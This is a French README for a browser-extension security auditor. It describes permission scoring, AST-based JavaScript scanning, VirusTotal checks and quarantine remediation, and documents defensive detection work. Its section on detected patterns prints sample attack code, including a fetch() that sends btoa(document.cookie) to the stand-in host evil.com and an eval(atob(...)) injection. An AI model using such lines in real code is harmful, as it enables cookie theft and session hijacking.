# Browser Extension Security Auditor

![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)
![Flask](https://img.shields.io/badge/Flask-3.0+-green.svg)

**Système professionnel de détection et remediation automatique d'extensions navigateur malveillantes**

Plateforme de cybersécurité complète combinant analyse statique de code, threat intelligence, et policy enforcement pour identifier et neutraliser les extensions malveillantes dans un environnement distribué.

---

## Contexte & Motivation

Les extensions navigateur représentent un vecteur d'attaque majeur souvent négligé en entreprise. Des extensions légitimes peuvent être rachetées par des acteurs malveillants (cas réels : The Great Suspender, Nano Adblocker) pour exfiltrer des données sensibles.

Ce projet démontre une approche SOC (Security Operations Center) pour :
- **Détecter** les extensions à risque via analyse multi-niveaux
- **Analyser** le code JavaScript pour identifier des patterns malveillants
- **Scorer** automatiquement le niveau de risque (0-100)
- **Remédier** via désactivation/quarantaine automatique

---

##  Fonctionnalités

###  Détection Multi-Niveaux

**1. Analyse des Permissions**
- Détection de 15+ catégories de permissions dangereuses
- Identification de combinaisons suspectes (ex: `cookies` + `webRequest`)
- Scoring pondéré par niveau de risque

**2. Code Scanner JavaScript**
- Analyse statique avec AST (Abstract Syntax Tree)
- Détection de 50+ patterns malveillants :
  - `eval()`, `Function()` - Code injection
  - `document.cookie` - Vol de session
  - `atob()`, `btoa()` - Obfuscation Base64
  - `fetch()` vers domaines suspects - Exfiltration
- Score d'obfuscation (0-100)

**3. Threat Intelligence**
- Intégration VirusTotal API
- Vérification de hash des extensions
- Score de réputation
- Détection de malware connu

###  Scoring de Risque Avancé

Algorithme multi-critères calculant un score 0-100 :
```python
Score = (
    Σ(poids_permissions_dangereuses) +
    Σ(combinaisons_suspectes) +
    bonus_manifest_v2 +
    bonus_obfuscation +
    bonus_excessive_permissions
)  cappé à 100
```

**Catégorisation :**
-  **Critique (70-100)** → Désactivation automatique recommandée
-  **Élevé (50-69)** → Quarantaine recommandée
-  **Moyen (30-49)** → Review manuel
-  **Faible (0-29)** → Monitoring

###  Remediation 

**Policy Enforcement :**
- Désactivation automatique (score ≥ 90)
- Quarantaine (score ≥ 85)
- Whitelist/Blacklist management
- Mode DRY-RUN pour tests sans impact

**Actions Disponibles :**
- `disable` - Renomme le dossier de l'extension
- `quarantine` - Déplace vers dossier sécurisé
- `remove_permissions` - Modifie le manifest
- `restore` - Restauration depuis quarantaine

---

##  Résultats de Détection

### Exemple Réel : Scan de 5 Extensions

| Extension | Navigateur | Findings | Score | Obfuscation | Verdict |
|-----------|------------|----------|-------|-------------|---------|
| **Ad Block Wonder** | Chrome | **200** | 95/100 | 100% |  **MALWARE** |
| Google Payments | Chrome | 131 | 78/100 | 100% | Légitime (Google) |
| RiftAbyssor | Chrome | 15 | 100/100 | 100% |  Suspect |
| Edge Helper | Edge | 34 | 72/100 | 100% | À surveiller |
| Text Changes | Edge | 1 | 12/100 | 0% |  Sûr |

**Détection la plus impressionnante :**
> Extension "Ad Block Wonder" - Faux ad-blocker avec 200 patterns malveillants détectés, code 100% obfusqué, multiples accès aux données sensibles. **Probablement un adware/spyware.**

---

##  Installation

### Prérequis

- Python 3.10+
- pip
- Windows, Linux ou MasOS (pour l'agent) + Linux (pour le backend)

### Backend (Linux/Kali)
```bash
cd extension-security-auditor

# Installation des dépendances
pip install -r requirements.txt --break-system-packages

# Initialisation de la base de données
sqlite3 backend/database/extensions.db < backend/database/schema.sql

# Lancement
python main.py
```

Services disponibles :
- API Backend : `http://127.0.0.1:5000`
- Dashboard : `http://127.0.0.1:8080`

### Agent 
```powershell
# Installation
pip install esprima jsbeautifier requests pyyaml

# Configuration
# Éditer agent/config.json avec l'URL de l'API backend

# Lancement
cd agent
python agent.py
```

---

##  Utilisation

### 1. Lancer le Backend
```bash
python main.py
```

Accéder au dashboard : `http://127.0.0.1:8080`

### 2. Lancer un Scan 
```powershell
python agent.py
```

Résultat :
```

  Analyse: RiftAbyssor
    Fichiers: 6
    Findings: 15 (Critique: 0, Élevé: 5)
    Obfuscation: 100/100
    Risques:
      - Code fortement obfusqué (score: 100)
      - Utilisation extensive de fonctions dangereuses

Scan terminé: 5/5 extensions analysées
```

### 3. Dashboard - Pages Disponibles

- **Dashboard** - Vue d'ensemble, statistiques, graphiques
- **Extensions** - Inventaire complet avec filtres
- **Alertes** - Extensions critiques détectées
- **Scans** - Historique des analyses
- **Remediation** - Actions de mitigation

---

##  Détails Techniques

### Technologies Utilisées

**Backend :**
- Flask (API REST)
- SQLite (persistence)
- esprima (AST parsing JavaScript)
- Requests (HTTP client)
- PyYAML (configuration)

**Frontend :**
- Bootstrap 5 (UI)
- Chart.js (visualisation)
- JavaScript vanilla

**Sécurité :**
- Regex pattern matching
- AST analysis
- VirusTotal API
- SOAR principles

### Patterns Malveillants Détectés

**Code Injection :**
```javascript
eval(atob('bWFsaWNpb3VzX2NvZGU='))  // Décodage Base64 + eval
new Function('malicious')()          // Construction dynamique
```

**Exfiltration de Données :**
```javascript
fetch('https://evil.com', {
    method: 'POST',
    body: btoa(document.cookie)      // Vol de cookies
})
```

**Obfuscation :**
```javascript
String.fromCharCode(109,97,108)      // Construction par codes
'\x6d\x61\x6c'                       // Hex encoding
```
---

## Configuration des Chemins Custom

Si les navigateurs ne sont pas détectés automatiquement, spécifiez les chemins dans `agent/config.json` :
```json
{
  "custom_paths": {
    "chrome": "/chemin/custom/vers/Extensions",
    "firefox": "/chemin/custom/vers/firefox",
    "edge": ""
  }
}
```

**Exemples de chemins :**

**Windows :**
- Chrome portable : `D:\PortableApps\Chrome\Data\profile\Extensions`
- Firefox custom : `E:\Programs\Firefox\Profiles\xxx.default\extensions`

**Linux :**
- Compilation manuelle : `/opt/google/chrome/extensions`
- Installation custom : `~/Applications/chrome/extensions`

**macOS :**
- Homebrew : `/usr/local/Caskroom/google-chrome/...`

---

##  Concepts Cybersécurité Démontrés

### 1. **Threat Detection**
- SIEM-like centralized logging
- Behavioral analysis
- Signature-based detection
- Heuristic analysis

### 2. **Static Code Analysis (SAST)**
- JavaScript AST parsing
- Pattern matching
- Obfuscation detection
- Control flow analysis

### 3. **Threat Intelligence**
- IOC (Indicators of Compromise)
- Reputation scoring
- External feeds (VirusTotal)

### 4. **Incident Response**
- Automated remediation
- Quarantine management
- Audit trail
- Policy enforcement (SOAR)

### 5. **Attack Vectors Covered**
- Session Hijacking (`document.cookie`)
- Code Injection (`eval`, `Function`)
- Data Exfiltration (Base64 + fetch)
- XSS (`innerHTML`)
- Man-in-the-Middle (`webRequest` + `cookies`)

---

##  Configuration

### Politiques de Remediation

Fichier : `config/config.yaml`
```yaml
remediation:
  thresholds:
    auto_disable_score: 90      # Désactivation auto
    auto_quarantine_score: 85   # Quarantaine
    critical_findings_max: 5    # Seuil findings critiques
  
  policies:
    auto_remediation_enabled: false  # Mode manuel par défaut
    quarantine_on_blacklist: true
  
  whitelist:
    - extension_id: "aapbdbdomjkkjkaonfhkkikfgjllcleb"
      reason: "Google Translate - Officielle"
```

### Threat Intelligence
```yaml
threat_intel:
  virustotal_api_key: "CLE_ICI"
  enable_vt_check: true
```

---

##  Ressources

- [OWASP Browser Security](https://owasp.org/www-community/controls/Browser_Security)
- [Chrome Extension Security](https://developer.chrome.com/docs/extensions/mv3/security/)
- [VirusTotal API](https://developers.virustotal.com/)